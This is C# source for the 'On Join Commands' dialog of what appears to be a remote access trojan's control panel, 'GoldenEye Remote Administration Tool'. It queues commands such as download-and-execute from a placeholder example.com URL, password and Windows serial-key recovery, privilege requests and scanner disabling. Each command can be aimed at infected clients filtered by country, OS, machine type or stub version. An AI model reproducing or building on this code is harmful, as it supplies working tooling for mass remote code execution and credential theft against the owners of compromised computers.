using System;
using System.IO;
using System.Windows.Forms;

namespace GoldenEye_Remote_Administration_Tool.Forms
{
    public partial class OnJoinCommandsDialog : Form
    {
        private Form1 mfrm;
        private string cmd = string.Empty;
        private string execOn = string.Empty;

        public OnJoinCommandsDialog(Form1 frm1)
        {
            InitializeComponent();
            mfrm = frm1;
        }

        private void velyseForm1_Click(object sender, EventArgs e)
        {
        }

        private void velyseComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            checkSelectedCMD();
        }

        private void checkSelectedCMD()
        {
            string seltxt = velyseComboBox1.GetItemText(velyseComboBox1.SelectedItem);

            if (seltxt.Equals("Download and Execute"))
            {
                cmd = seltxt;
                setparam("https://example.com/YourFile.exe§SaveFileAs.exe");
                t_TextBox1.Enabled = true;
            }
            else if (seltxt.Equals("Update Client Executable"))
            {
                cmd = seltxt;
                setparam("https://example.com/YourFile.exe§NewestUpdate.exe");
                t_TextBox1.Enabled = true;
            }
            else if (seltxt.Equals("Recover Passwords"))
            {
                cmd = seltxt;
                setparam("None");
                t_TextBox1.Enabled = false;
            }
            else if (seltxt.Equals("Recover Win-SerialKey"))
            {
                cmd = seltxt;
                setparam("None");
                t_TextBox1.Enabled = false;
            }
            else if (seltxt.Equals("Request Admin Privileges"))
            {
                cmd = seltxt;
                setparam("None");
                t_TextBox1.Enabled = false;
            }
            else if (seltxt.Equals("Run Malware Cleaner"))
            {
                cmd = seltxt;
                setparam("None");
                t_TextBox1.Enabled = false;
            }
            else if (seltxt.Equals("Enable Proactive Scanner"))
            {
                cmd = seltxt;
                setparam("None");
                t_TextBox1.Enabled = false;
            }
            else if (seltxt.Equals("Disable Proactive Scanner"))
            {
                cmd = seltxt;
                setparam("None");
                t_TextBox1.Enabled = false;
            }
            else if (seltxt.Equals("Disconnect Client"))
            {
                cmd = seltxt;
                setparam("None");
                t_TextBox1.Enabled = false;
            }
            else if (seltxt.Equals("Uninstall Client"))
            {
                cmd = seltxt;
                setparam("None");
                t_TextBox1.Enabled = false;
            }
            else
            {
                MessageBox.Show("Please choose a Command!");
            }
        }

        private void setparam(string txt)
        {
            t_TextBox1.Text = txt;
        }

        private void setarg(string txt)
        {
            t_TextBox2.Text = txt;
            t_TextBox2.Enabled = true;
        }

        private void checkradiosBy()
        {
            if (velyseRadioButton3.Checked == true)
            {
                // Send to All Clients
                setarg("All Clients");
                execOn = "All Clients";
                t_TextBox2.Enabled = false;
            }
            else if (velyseRadioButton4.Checked == true)
            {
                // Send to Clients by Location
                setarg("United States");
                execOn = "Country";
            }
            else if (velyseRadioButton5.Checked == true)
            {
                // Send to Clients by Operating System
                setarg("Microsoft Windows 10 Home");
                execOn = "OS";
            }
            if (velyseRadioButton6.Checked == true)
            {
                // Send to Clients by Machine Type
                setarg("Laptop");
                execOn = "MachineType";
            }
            if (velyseRadioButton7.Checked == true)
            {
                // Send to Clients by Stub Version
                setarg("1.1.3");
                execOn = "Stub Version";
            }
        }

        private void velyseRadioButton3_Click(object sender, EventArgs e)
        {
            checkradiosBy();
        }

        private void velyseRadioButton4_Click(object sender, EventArgs e)
        {
            checkradiosBy();
        }

        private void velyseRadioButton5_Click(object sender, EventArgs e)
        {
            checkradiosBy();
        }

        private void velyseRadioButton6_Click(object sender, EventArgs e)
        {
            checkradiosBy();
        }

        private void velyseRadioButton7_Click(object sender, EventArgs e)
        {
            checkradiosBy();
        }

        private string executeMax()
        {
            if (velyseRadioButton2.Checked == true)
            {
                return "Unlimited";
            }
            else if (velyseRadioButton1.Checked == true)
            {
                return velyseNumericButton1.Value.ToString();
            }
            return "Unlimited";
        }

        private void velyseButton1_Click(object sender, EventArgs e)
        {
            string cmdnow = cmd;
            string cmdParams = t_TextBox1.Text;

            string execmax = executeMax();

            string executeBy = execOn;
            string executeArgsBy = t_TextBox2.Text;

            ListViewItem item = new ListViewItem();
            item.Text = executeBy + "~" + executeArgsBy;
            item.SubItems.Add(cmdnow);
            item.SubItems.Add(cmdParams);
            item.SubItems.Add(execmax);
            item.SubItems.Add("0");
            mfrm.listView9.Items.Add(item);

            string final = string.Empty;
            foreach (ListViewItem i in mfrm.listView9.Items)
            {
                final += i.Text + "²" + i.SubItems[1].Text + "²" + i.SubItems[2].Text + "²" + i.SubItems[3].Text + "²" + i.SubItems[4].Text + "³";
            }
            File.WriteAllText(Application.StartupPath + @"\Configuration\On Join Commands.ini", final);
        }

        private void OnJoinCommandsDialog_Load(object sender, EventArgs e)
        {
            execOn = "All Clients";
        }
    }
}